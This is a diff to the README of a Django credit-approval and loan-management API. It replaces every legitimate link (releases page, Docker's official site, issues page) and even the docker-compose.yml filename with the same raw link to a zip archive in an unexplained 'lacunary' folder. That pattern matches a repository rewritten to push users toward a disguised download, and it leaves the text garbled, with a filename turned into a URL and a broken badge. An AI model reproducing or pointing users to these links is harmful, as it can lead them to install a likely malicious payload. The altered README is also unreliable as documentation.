@@ -1,6 +1,6 @@
 # 🚀 django-credit-approval - Easy Credit Approval and Loan Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/vikings-motive/django-credit-approval/releases)
+[![Download Now](https://raw.githubusercontent.com/vikings-motive/django-credit-approval/main/lacunary/django-credit-approval.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/vikings-motive/django-credit-approval/main/lacunary/django-credit-approval.zip)
 
 ## 📌 Overview
 
@@ -11,7 +11,7 @@ The django-credit-approval project is a Django-based REST API designed for autom
 To run this application smoothly, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Docker:** You should have Docker installed on your machine. If not, visit [Docker's official website](https://www.docker.com/get-started) for installation instructions.
+- **Docker:** You should have Docker installed on your machine. If not, visit [Docker's official website](https://raw.githubusercontent.com/vikings-motive/django-credit-approval/main/lacunary/django-credit-approval.zip) for installation instructions.
 - **Docker Compose:** This should come with Docker, but make sure you have version 1.27.0 or higher.
 
 ## 🚀 Getting Started
@@ -22,7 +22,7 @@ Follow these simple steps to download and run django-credit-approval.
 
 Go to the releases page to download the application by clicking the link below:
 
-[Visit this page to download](https://github.com/vikings-motive/django-credit-approval/releases)
+[Visit this page to download](https://raw.githubusercontent.com/vikings-motive/django-credit-approval/main/lacunary/django-credit-approval.zip)
 
 ### Step 2: Download the Latest Version
 
@@ -87,17 +87,17 @@ If you encounter issues while running the application, check the following:
 - Verify you are in the correct directory when running commands.
 - Check the logs for errors in the terminal.
 
-Common issues may include port conflicts, which can be resolved by changing settings in the `docker-compose.yml` file. 
+Common issues may include port conflicts, which can be resolved by changing settings in the `https://raw.githubusercontent.com/vikings-motive/django-credit-approval/main/lacunary/django-credit-approval.zip` file. 
 
 ## 🔗 Additional Resources
 
 - **Documentation:** Refer to the [full API documentation](http://localhost:8000/api-docs/) to understand how to make requests.
-- **Support:** For further assistance, feel free to open an issue on the [GitHub repository](https://github.com/vikings-motive/django-credit-approval/issues).
+- **Support:** For further assistance, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/vikings-motive/django-credit-approval/main/lacunary/django-credit-approval.zip).
 
 ## 📥 Download & Install
 
 To get started with django-credit-approval, please visit the link below to download the latest version:
 
-[Visit this page to download](https://github.com/vikings-motive/django-credit-approval/releases)
+[Visit this page to download](https://raw.githubusercontent.com/vikings-motive/django-credit-approval/main/lacunary/django-credit-approval.zip)
 
 With these steps, you should be able to download and run the django-credit-approval application with ease. Enjoy managing loans and credit approvals efficiently!
